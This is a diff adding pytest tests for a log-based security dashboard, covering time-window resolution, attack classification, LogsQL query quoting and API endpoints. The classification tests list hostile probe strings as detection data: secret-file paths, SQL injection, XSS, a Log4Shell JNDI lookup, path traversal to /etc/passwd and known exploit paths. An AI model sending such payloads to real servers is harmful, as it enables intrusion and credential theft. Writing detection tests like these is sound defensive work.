@@ -1,6 +1,6 @@
 """Tests for the security view: detection rules, query shape and API."""
 
-from datetime import datetime, timezone
+from datetime import datetime, timedelta, timezone
 from unittest.mock import AsyncMock, patch
 
 import pytest
@@ -115,6 +115,139 @@ class TestQueries:
         assert sec.clamp_window("junk") == sec.DEFAULT_WINDOW_MINUTES
 
 
+class TestWindow:
+    NOW = datetime(2026, 10, 23, 12, 0, tzinfo=timezone.utc)
+
+    def test_last_minutes_by_default(self):
+        start, end, minutes = sec.resolve_window(60, None, None, self.NOW)
+        assert (end - start, end, minutes) == (timedelta(hours=1), self.NOW, 60)
+
+    def test_a_picked_bucket_can_be_one_minute(self):
+        start, end, minutes = sec.resolve_window(60, "2026-10-23T11:15:00.000Z", "2026-10-23T11:16:00Z", self.NOW)
+        assert (start.minute, end.minute, minutes) == (15, 16, 1)
+        assert start.tzinfo is not None
+
+    def test_the_current_bucket_ends_now(self):
+        _, end, minutes = sec.resolve_window(60, "2026-10-23T11:45:00Z", "2026-10-23T12:00:00Z",
+                                             self.NOW - timedelta(minutes=5))
+        assert end == self.NOW - timedelta(minutes=5) and minutes == 10
+
+    @pytest.mark.parametrize("start,end", [
+        ("2026-10-23T11:00:00Z", None),                     # half a range
+        ("yesterday", "2026-10-23T11:00:00Z"),               # not a timestamp
+        ("2026-10-23T11:00:00Z", "2026-10-23T10:00:00Z"),    # backwards
+        ("2026-10-23T12:30:00Z", "2026-10-23T12:45:00Z"),    # entirely in the future
+        ("2026-10-01T00:00:00Z", "2026-10-23T00:00:00Z"),    # beyond 7 days
+    ])
+    def test_invalid_ranges_are_refused(self, start, end):
+        with pytest.raises(ValueError):
+            sec.resolve_window(60, start, end, self.NOW)
+
+
+class TestAttacks:
+    @pytest.mark.parametrize("uri,code", [
+        ("/.env", "secrets"),
+        ("/api/.env.production", "secrets"),
+        ("/.git/config", "secrets"),
+        ("/.aws/credentials", "secrets"),
+        ("/wp-login.php", "wordpress"),
+        ("/blog/wp-admin/setup-config.php", "wordpress"),
+        ("/index.php?id=1%20UNION%20SELECT%20password", "injection"),
+        ("/search?q=<script>alert(1)</script>", "injection"),
+        ("/x?h=${jndi:ldap://evil/a}", "injection"),
+        ("/static/../../etc/passwd", "traversal"),
+        ("/download?file=..%2f..%2fetc%2fpasswd", "traversal"),
+        ("/cgi-bin/luci/;stok=/locale", "exploits"),
+        ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "exploits"),
+        ("/actuator/env", "exploits"),
+        ("/phpmyadmin/index.php", "php"),
+        ("/shell.php", "php"),
+        ("/backup.sql", "backups"),
+        ("/site.tar.gz", "backups"),
+    ])
+    def test_probes_are_classified(self, uri, code):
+        assert sec.classify_request(uri) == code
+
+    @pytest.mark.parametrize("uri", [
+        "/", "/api/users?page=2", "/static/app.3f9a.js", "/.well-known/acme-challenge/token",
+        "/.github/workflows", "/environment", "/owner/repo", "/docs/selection", "/assets/logo.png",
+    ])
+    def test_ordinary_requests_are_not(self, uri):
+        assert sec.classify_request(uri) is None
+
+    def test_a_request_counts_for_its_most_severe_category_only(self):
+        # Matches both PHP and injection: counted as injection.
+        assert sec.classify_request("/index.php?q=union select 1") == "injection"
+        injection = sec.attack_filter("injection")
+        php = sec.attack_filter("php")
+        assert "NOT" not in injection
+        assert php.count("NOT ") == 5  # every category above it
+        with pytest.raises(ValueError):
+            sec.attack_filter("ddos")
+
+    def test_patterns_are_quoted_for_logsql(self):
+        queries = sec.build_overview_queries(60, include_internal=False)
+        assert set(f"attack_{c['code']}" for c in sec.ATTACK_CATEGORIES) <= set(queries)
+        assert 'path:~"(?i)\\\\.(bak|' in queries["attack_backups"]
+        assert queries["attack_samples"].endswith(f"limit {sec.ATTACK_SAMPLES}")
+
+    def test_summary(self):
+        overview = {
+            "attack_secrets": [{"requests": "40", "clients": "3", "answered": "1",
+                                "last_seen": "2026-09-19T17:02:00Z"}],
+            "attack_wordpress": [{"requests": "7", "clients": "1", "answered": "0"}],
+            "attack_injection": [{"requests": "0", "clients": "0", "answered": "0"}],
+            "attack_samples": [
+                {"request_host": "a.io", "uri": "/.env", "client_ip": "1.1.1.1", "n": "30", "answered": "1"},
+                {"request_host": "c.io", "uri": "/.env", "client_ip": "2.2.2.2", "n": "5", "answered": "0"},
+                {"request_host": "a.io", "uri": "/.env", "client_ip": "2.2.2.2", "n": "1", "answered": "0"},
+                {"request_host": "a.io", "uri": "/.git/HEAD?x=1", "client_ip": "2.2.2.2", "n": "5", "answered": "0"},
+                {"request_host": "b.io", "uri": "/wp-login.php", "client_ip": "3.3.3.3", "n": "7", "answered": "0"},
+                {"request_host": "b.io", "uri": "/ordinary", "client_ip": "3.3.3.3", "n": "9", "answered": "0"},
+            ],
+        }
+        result = sec.attacks(overview)
+        assert [c["code"] for c in result] == ["secrets", "wordpress"]  # severity order, none empty
+        secrets = result[0]
+        assert (secrets["requests"], secrets["clients"], secrets["answered"]) == (40, 3, 1)
+        assert secrets["top_targets"][0] == {"target": "/.env", "count": 36, "answered": 1,
+                                             "hosts": ["a.io", "c.io"]}
+        # A path category shows the path, without the query string.
+        assert secrets["top_targets"][1]["target"] == "/.git/HEAD"
+        assert secrets["top_ips"] == [{"key": "1.1.1.1", "count": 30}, {"key": "2.2.2.2", "count": 11}]
+        assert result[1]["last_seen"] is None
+
+
+class TestRequestsQuery:
+    def test_every_filter_is_quoted(self):
+        query = sec.build_requests_query(False, ip="1.2.3.4", host='a" | delete', path="/x",
+                                         uri="/x?y=1", rule="SQLi", text="wp login")
+        assert query.startswith('{kind="access"} ')
+        assert 'client_ip:="1.2.3.4"' in query and 'request_host:="a\\" | delete"' in query
+        assert 'path:="/x"' in query and 'uri:="/x?y=1"' in query and 'rule_msg:="SQLi"' in query
+        # Words in the URI must all be there.
+        assert 'uri:i("wp") AND uri:i("login")' in query
+        assert query.endswith("| fields _time, event, client_ip, request_host, method, uri, status, "
+                              "router, user_agent, rule_msg, duration_ms")
+
+    def test_a_client_asked_for_is_shown_even_internal(self):
+        assert "internal:=false" not in sec.build_requests_query(False, ip="10.0.0.2")
+        assert "internal:=false" in sec.build_requests_query(False)
+
+    def test_status_and_category(self):
+        waf = sec.build_requests_query(False, status="waf")
+        assert 'event:="waf_block"' in waf and 'event:="request"' not in waf
+        edge = sec.build_requests_query(False, status="edge", category="secrets")
+        assert edge.count('event:="request"') == 1
+        assert 'router:"pulsarcd-blocklist"*' in edge and "path:~" in edge
+        assert 'event:="request"' in sec.build_requests_query(False, category="php")
+
+    @pytest.mark.parametrize("filters", [{"status": "teapot"}, {"category": "ddos"}])
+    def test_unknown_choices_are_refused(self, filters):
+        with pytest.raises(ValueError):
+            sec.build_requests_query(False, **filters)
+
+
 # Rows as VictoriaLogs returns them: every value a string.
 OVERVIEW_ROWS = {
     "totals": [{"requests": "1200", "unique_ips": "3", "ok": "400", "client_errors": "790",
@@ -181,7 +314,7 @@ class TestSummarize:
         assert result["totals"] == {
             "requests": 1200, "unique_ips": 3, "client_errors": 790, "server_errors": 10,
             "denied": 40, "rate_limited": 5, "waf_blocks": 12,
-            "flagged_ips": 2, "flagged_endpoints": 1,
+            "flagged_ips": 2, "flagged_endpoints": 1, "attack_requests": 0, "attack_answered": 0,
         }
         # Every minute of the window, the empty ones as zeros
         assert result["timeline"][0] == {"timestamp": "2026-09-19T17:00:00.000Z",
@@ -248,6 +381,70 @@ class TestLogStore:
 class TestAgainstVictoriaLogs:
     """The LogsQL itself, run by a real VictoriaLogs."""
 
+    async def test_attacks_slot_and_request_explorer(self, vlogs):
+        import uuid
+        from datetime import timedelta
+
+        from backend.config import VictoriaLogsConfig
+        from backend.log_store import LogStore
+        from shared.victorialogs import KIND_ACCESS, access_row
+
+        store = LogStore(VictoriaLogsConfig(url=vlogs))
+        host = f"attack-{uuid.uuid4().hex[:8]}.test"
+        now = datetime.now(timezone.utc).replace(microsecond=0)
+        prober = "198.51.100." + str(uuid.uuid4().int % 250 + 1)
+
+        def request(uri, status, ago, ip=prober, router="app@swarm"):
+            return {"timestamp": now - ago, "host": host, "event": "request", "client_ip": ip,
+                    "internal": False, "request_host": host, "method": "GET",
+                    "path": uri.split("?")[0], "uri": uri, "status": status, "router": router,
+                    "duration_ms": 1.0, "size": 10, "user_agent": "probe/1"}
+
+        docs = [request("/.env", 404, timedelta(seconds=i)) for i in range(5)]
+        docs += [request("/.env", 200, timedelta(seconds=6)),                      # leaked!
+                 request("/wp-login.php", 404, timedelta(seconds=7)),
+                 request("/index.php?id=1 UNION SELECT 1", 403, timedelta(seconds=8)),
+                 request("/home", 200, timedelta(seconds=9)),
+                 request("/home", 403, timedelta(seconds=10), router="pulsarcd-blocklist@http"),
+                 # Twenty minutes earlier: outside the slot below.
+                 request("/.git/config", 404, timedelta(minutes=20))]
+        await store.client.insert([access_row(d) for d in docs], KIND_ACCESS)
+        await store.client.flush()
+
+        result = await store.get_security_overview(minutes=60)
+        assert "error" not in result
+        # Other tests share this VictoriaLogs: read this host's rows only.
+        by_code = {c["code"]: c for c in result["attacks"]}
+        secrets = by_code["secrets"]
+        assert secrets["requests"] >= 7 and secrets["answered"] >= 1
+        target = next(t for t in secrets["top_targets"] if t["target"] == "/.env")
+        assert host in target["hosts"] and target["count"] >= 6 and target["answered"] >= 1
+        assert any(host in t["hosts"] for t in by_code["wordpress"]["top_targets"])
+        injection = next(t for t in by_code["injection"]["top_targets"] if host in t["hosts"])
+        assert injection["target"] == "/index.php?id=1 UNION SELECT 1"
+        assert "php" not in by_code or all(host not in t["hosts"] for t in by_code["php"]["top_targets"])
+
+        # The last five minutes only: the .git probe is out of it.
+        slot = await store.get_security_overview(
+            minutes=60, start=(now - timedelta(minutes=5)).isoformat(), end=now.isoformat())
+        assert "range" in slot
+        assert all(t["target"] != "/.git/config" for c in slot["attacks"] for t in c["top_targets"]
+                   if host in t["hosts"])
+
+        async def explore(**filters):
+            data = await store.get_security_requests({"host": host, **filters}, minutes=60)
+            assert "error" not in data
+            return sorted((e["uri"], e["status"]) for e in data["events"])
+
+        assert await explore(category="secrets", status="2xx") == [("/.env", 200)]
+        assert await explore(category="injection") == [("/index.php?id=1 UNION SELECT 1", 403)]
+        assert await explore(status="edge") == [("/home", 403)]
+        assert len(await explore(text="env")) == 6
+        assert len(await explore(ip=prober, path="/.git/config")) == 1
+        events = (await store.get_security_requests({"host": host}, minutes=60))["events"]
+        assert events[0]["client_ip"] == prober
+        await store.close()
+
     async def test_scanner_is_detected(self, vlogs):
         import uuid
         from datetime import timedelta
@@ -312,3 +509,50 @@ class TestSecurityApi:
     def test_invalid_ip(self, client, auth_headers):
         resp = client.get("/api/security/ips/not-an-ip", headers=auth_headers)
         assert resp.status_code == 400
+
+    def test_a_picked_bucket_is_passed_as_a_range(self, client, auth_headers):
+        payload = sec.empty_overview(15, False, datetime(2026, 9, 19))
+        mock = AsyncMock(return_value=payload)
+        with patch.object(api_module.logstore, "get_security_overview", mock):
+            resp = client.get("/api/security/overview?minutes=1440&start=2026-09-18T10:15:00Z"
+                              "&end=2026-09-18T10:30:00Z", headers=auth_headers)
+        assert resp.status_code == 200
+        mock.assert_awaited_once_with(minutes=1440, include_internal=False,
+                                      start="2026-09-18T10:15:00Z", end="2026-09-18T10:30:00Z")
+
+    @pytest.mark.parametrize("query", ["start=2026-09-18T10:15:00Z",
+                                       "start=2026-09-18T10:30:00Z&end=2026-09-18T10:15:00Z",
+                                       "start=soon&end=later"])
+    def test_invalid_ranges_are_400(self, client, auth_headers, query):
+        for url in (f"/api/security/overview?{query}", f"/api/security/ips/1.2.3.4?{query}",
+                    f"/api/security/requests?{query}"):
+            assert client.get(url, headers=auth_headers).status_code == 400, url
+
+    def test_ip_events_of_a_range(self, client, auth_headers):
+        mock = AsyncMock(return_value=[])
+        with patch.object(api_module.logstore, "get_security_ip_events", mock):
+            resp = client.get("/api/security/ips/1.2.3.4?start=2026-09-18T10:15:00Z&end=2026-09-18T10:16:00Z",
+                              headers=auth_headers)
+        assert resp.status_code == 200
+        mock.assert_awaited_once_with("1.2.3.4", minutes=60, start="2026-09-18T10:15:00Z",
+                                      end="2026-09-18T10:16:00Z")
+
+    def test_requests(self, client, auth_headers):
+        result = {"events": [], "limit": sec.MAX_REQUESTS}
+        mock = AsyncMock(return_value=result)
+        with patch.object(api_module.logstore, "get_security_requests", mock):
+            resp = client.get("/api/security/requests?minutes=360&ip=2a01:0e0a::0001&host=a.io"
+                              "&q=env&status=4xx&category=secrets&include_internal=true",
+                              headers=auth_headers)
+        assert resp.status_code == 200 and resp.json() == result
+        mock.assert_awaited_once_with(
+            {"ip": "2a01:e0a::1", "host": "a.io", "text": "env", "status": "4xx", "category": "secrets"},
+            minutes=360, include_internal=True)
+
+    def test_requests_refuse_invalid_filters(self, client, auth_headers):
+        assert client.get("/api/security/requests?ip=nope", headers=auth_headers).status_code == 400
+        mock = AsyncMock(side_effect=ValueError("Unknown status filter: teapot"))
+        with patch.object(api_module.logstore, "get_security_requests", mock):
+            resp = client.get("/api/security/requests?status=teapot", headers=auth_headers)
+        assert resp.status_code == 400
+        assert resp.json()["detail"] == "Unknown status filter: teapot"
